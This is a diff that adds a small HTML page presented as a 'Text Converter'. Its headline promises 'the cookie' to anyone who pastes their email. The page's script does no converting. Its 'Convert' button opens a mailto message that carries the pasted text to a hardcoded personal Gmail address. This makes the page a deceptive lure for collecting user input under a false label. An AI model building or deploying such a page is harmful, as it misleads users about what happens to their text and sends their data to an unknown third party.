@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Text Converter</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+    * {
+        box-sizing: border-box;
+        font-family: "Segoe UI", sans-serif;
+    }
+
+    body {
+        margin: 0;
+        height: 100vh;
+        overflow: hidden;
+        background: linear-gradient(120deg, #ffffff, #dbefff, #ffffff);
+        background-size: 400% 400%;
+        animation: gradientMove 10s ease infinite;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    @keyframes gradientMove {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+
+    .bg-layer {
+        position: absolute;
+        inset: -50px;
+        background: radial-gradient(circle at center, rgba(0,123,255,0.15), transparent 60%);
+        transition: transform 0.1s ease;
+        pointer-events: none;
+    }
+
+    .container {
+        position: relative;
+        z-index: 2;
+        background: rgba(255,255,255,0.85);
+        backdrop-filter: blur(12px);
+        padding: 30px;
+        border-radius: 16px;
+        box-shadow: 0 20px 50px rgba(0,0,0,0.15);
+        width: 90%;
+        max-width: 600px;
+    }
+
+    .title {
+        font-size: 20px;
+        font-weight: 600;
+        margin-bottom: 12px;
+        color: #222;
+    }
+
+    .input-row {
+        display: flex;
+        gap: 10px;
+    }
+
+    textarea {
+        flex: 1;
+        height: 90px;
+        resize: none;
+        padding: 14px;
+        border-radius: 12px;
+        border: 1px solid #ccc;
+        font-size: 15px;
+        outline: none;
+    }
+
+    textarea:focus {
+        border-color: #007bff;
+    }
+
+    button {
+        width: 120px;
+        border: none;
+        border-radius: 12px;
+        background: #2ecc71;
+        color: white;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: transform 0.15s ease, box-shadow 0.15s ease, opacity 0.15s;
+    }
+
+    button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(46,204,113,0.4);
+    }
+
+    button:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+        box-shadow: none;
+        transform: none;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="bg-layer" id="bg"></div>
+
+<div class="container">
+    <div class="title">Write your email to get the cookie</div>
+
+    <div class="input-row">
+        <textarea id="textInput" placeholder="paste your email here"></textarea>
+        <button id="convertBtn" disabled>Convert</button>
+    </div>
+</div>
+
+<script>
+    const bg = document.getElementById("bg");
+    const textarea = document.getElementById("textInput");
+    const button = document.getElementById("convertBtn");
+
+    document.addEventListener("mousemove", (e) => {
+        const x = (e.clientX / window.innerWidth - 0.5) * 30;
+        const y = (e.clientY / window.innerHeight - 0.5) * 30;
+        bg.style.transform = `translate(${x}px, ${y}px)`;
+    });
+
+    textarea.addEventListener("input", () => {
+        button.disabled = textarea.value.trim() === "";
+    });
+
+    button.addEventListener("click", () => {
+        const text = textarea.value.trim();
+        if (!text) return;
+
+        const subject = encodeURIComponent("Converted Text");
+        const body = encodeURIComponent(text);
+
+        window.location.href = `mailto:noalaklak22450@gmail.com?subject=${subject}&body=${body}`;
+    });
+</script>
+
+</body>
+</html>
